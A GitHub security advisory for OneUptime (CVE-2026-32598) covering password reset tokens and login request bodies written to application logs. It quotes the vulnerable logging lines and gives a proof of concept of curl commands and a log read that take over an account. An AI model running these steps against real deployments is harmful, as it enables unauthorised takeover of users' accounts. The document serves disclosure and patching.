# [M] OneUptime: Password Reset Token Logged at INFO Level

## Summary
Severity: Medium
Advisory: GHSA-4524-cj9j-g4fj
CVE: CVE-2026-32598
CWE: CWE-532
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-4524-cj9j-g4fj
Type: github-advisory

## Affected
- npm: `oneuptime` — affected >=0 <10.0.23

## Details
### Summary

The password reset flow logs the complete password reset URL — containing the plaintext reset token — at INFO log level, which is enabled by default in production. Anyone with access to application logs (log aggregation, Docker logs, Kubernetes pod logs) can intercept reset tokens and perform account takeover on any user.

### Details

**Vulnerable code — `App/FeatureSet/Identity/API/Authentication.ts` lines 370-371:**
```typescript
logger.info("User forgot password: " + user.email?.toString());
logger.info("Reset Password URL: " + tokenVerifyUrl);
```

The `tokenVerifyUrl` is a complete URL like `https://app.oneuptime.com/accounts/reset-password/<plaintext-token>`. This is logged at INFO level, which is enabled by default in production and persisted to stdout, log files, and any configured log aggregation systems.

**Additionally — login credentials logged at DEBUG level (line 909):**
```typescript
logger.debug("Login request data: " + JSON.stringify(req.body, null, 2));
```

The entire login request body (including cleartext password) is logged at DEBUG level. While DEBUG is typically disabled in production, it is commonly enabled during incident troubleshooting.

No existing CVEs cover sensitive data exposure in logging for OneUptime. CVE-2026-30956 (GHSA-r5v6-2599-9g3m) leaked `resetPasswordToken` from the database via multi-tenant header bypass — this finding is different (token leaked via application logs).

### PoC

**Environment:** OneUptime v10.0.23 via `docker compose up` (default configuration)

```bash
# Step 1 — Trigger forgot-password for target user
curl -s -X POST http://TARGET:8080/api/identity/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"data": {"email": "test@example.com"}}'
# Response: {}

# Step 2 — Read application logs to extract the reset token
docker compose logs app --tail 5
# Output:
# app-1  | User forgot password: test@example.com
# app-1  | Reset Password URL: http://localhost/accounts/reset-password/20771cc6-860a-4b9b-bb9c-09eff67de4ef

# Step 3 — Use the extracted token to reset the victim's password
curl -s -X POST http://TARGET:8080/api/identity/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"data": {"token": "20771cc6-860a-4b9b-bb9c-09eff67de4ef", "password": "NewPassword123!"}}'
```

**Tested and confirmed on 2026-03-12 against `oneuptime/app:release` (APP_VERSION=10.0.23).** Full password reset token `20771cc6-860a-4b9b-bb9c-09eff67de4ef` visible in INFO-level logs.

**Attack surface for log access:** ELK/Elasticsearch dashboards (often misconfigured with default credentials), CloudWatch/Datadog/Splunk/Grafana Loki, `docker logs` / `kubectl logs`, shared log volumes, CDN/proxy access logs.

### Impact

Any user's account can be taken over by anyone with read access to application logs:

- **Account takeover:** Every password reset token is logged in plaintext, creating a persistent trail of sensitive tokens
- **Exposure scale:** This logs EVERY password reset request — not a one-off, but systematic
- **Cascading impact:** Combined with differential error responses in forgot-password (user enumeration), an attacker can systematically target any user
- Organizations that aggregate OneUptime logs into shared logging infrastructure expose all password reset tokens to anyone with log reader access

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-4524-cj9j-g4fj
- https://nvd.nist.gov/vuln/detail/CVE-2026-32598
- https://github.com/OneUptime/oneuptime
- https://github.com/OneUptime/oneuptime/releases/tag/10.0.23
